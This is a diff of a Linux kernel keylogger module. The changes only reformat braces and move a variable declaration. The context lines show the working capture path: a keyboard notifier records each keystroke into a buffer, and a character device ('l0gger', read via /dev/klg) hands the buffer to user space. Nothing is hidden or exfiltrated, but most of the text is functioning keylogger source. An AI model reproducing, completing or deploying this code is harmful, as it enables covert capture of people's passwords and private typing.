@@ -1,11 +1,12 @@
 /* Necessary includes for device drivers */
 
+
 #include <linux/kernel.h>
 #include <asm/uaccess.h>
-
 #include "klogger.h"
 #define LOUD 0
 #define DEV_NAME "l0gger"
+
 int klg_init(void) {
 	int result;
 
@@ -26,7 +27,6 @@ int klg_init(void) {
 void klg_exit(void) {
 	/* Freeing the major number */
 	unregister_chrdev(KLG_MAJOR, DEV_NAME);
-
 	unregister_keyboard_notifier(&nb);
 	memset(buffer, 0, sizeof buffer);
 	bptr = buffer;
@@ -49,7 +49,7 @@ ssize_t klg_read(struct file *filp, char __user *buf, size_t count, loff_t *f_po
 	#if(LOUD > 0)
 	printk(KERN_DEBUG "[Key logger]: Reading /dev/klg\n");
 	#endif
-
+	int ret;
 	char* p = buffer;
 	int bytes = 0;
 
@@ -63,7 +63,7 @@ ssize_t klg_read(struct file *filp, char __user *buf, size_t count, loff_t *f_po
 	#endif
 	if(bytes == 0 || *f_pos) return 0;
 
-	int ret = copy_to_user(buf, buffer, bytes);
+	ret = copy_to_user(buf, buffer, bytes);
 
 	if(ret) {
 		
@@ -79,18 +79,24 @@ ssize_t klg_read(struct file *filp, char __user *buf, size_t count, loff_t *f_po
 }
 
 int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* _param) {
+
 	struct keyboard_notifier_param *param = _param;
 
-	if(code == KBD_KEYCODE && param->down) {
-		if(param-> value == KEY_BACKSPACE) {
-			if(bptr != buffer) {
+	if(code == KBD_KEYCODE && param->down) 
+	{
+		if(param-> value == KEY_BACKSPACE) 
+		{
+			if(bptr != buffer) 
+			{
 				--bptr;
 				*bptr = '\0';
 			}
 		}
-		else {
+		else 
+		{
 			char ch = get_ascii(param->value);
-			if(ch != 'X') {
+			if(ch != 'X') 
+			{
 				*bptr = ch;
 				bptr++;
 				if(bptr == endptr) bptr = buffer;
